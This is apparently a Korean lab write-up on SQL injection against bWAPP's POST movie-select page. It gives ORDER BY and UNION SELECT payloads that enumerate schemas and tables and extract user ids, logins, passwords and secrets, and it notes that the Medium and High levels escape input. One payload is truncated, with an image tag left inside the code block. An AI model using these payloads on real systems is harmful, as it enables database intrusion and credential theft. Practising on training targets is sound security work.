---
layout: single
title: (bWAPP)SQL Injection POST/Search
categories: Web-vuln
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low
![그림 1-1](/assets/image/bwapp/sqlp-select/image.png)

- Select 기능을 통해 특정 값을 추출함
- 입력값을 전달할 수 있는 방안이 페이지상에 없어 Proxy Tool을 사용

![그림 1-2](/assets/image/bwapp/sqlp-select/image2.png)

- 입력값은 POST 형식으로 전송
- movie 파라미터에 int 형으로 전송

![그림 1-3](/assets/image/bwapp/sqlp-select/image3.png)

- '(싱글쿼터) 를 통해 DBMS Error 유/무 확인
- DBMS Error 에러발생

```sql
1 order by 8-- 
```

- order by 절 을 사용하여 컬럼 개수 파악
- 7개의 컬럼 존재 추정
![그림 1-4](/assets/image/bwapp/sqlp-select/image4.png)
- 우선 출력포지션을 확인했다.

```sql
1 and 1=2 union select 1,2,3,4,5,6,7--
```

![그림 1-5](/assets/image/bwapp/sqlp-select/imag5.png)
- 이후 동일하게 테이블명, 컬럼명, 데이터 추출을 시도함.

```sql
1 and 1=2 union select 1,schema_name,3,4,5,6,7 from information_schema.schemata limit 2,1--
```

```sql
1 and 1=2 union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema='bWAPP' limit 3,1--
```

```sql
1 and 1=2 union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_schema='bWAPP' and table_name='users' limit 1,1--
```

```sql
 and 1=2 union select 1,concat(id,0x3a,login),concat(password,0x3a,secret),4,admin,6,7 from bWAPP.users limit 
 
 ![그림 1-6](/assets/image/bwapp/sqlp-select/image6.png)
 ```

- 성공적으로 id, login, password, secret 데이터를 출출했다.

## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.

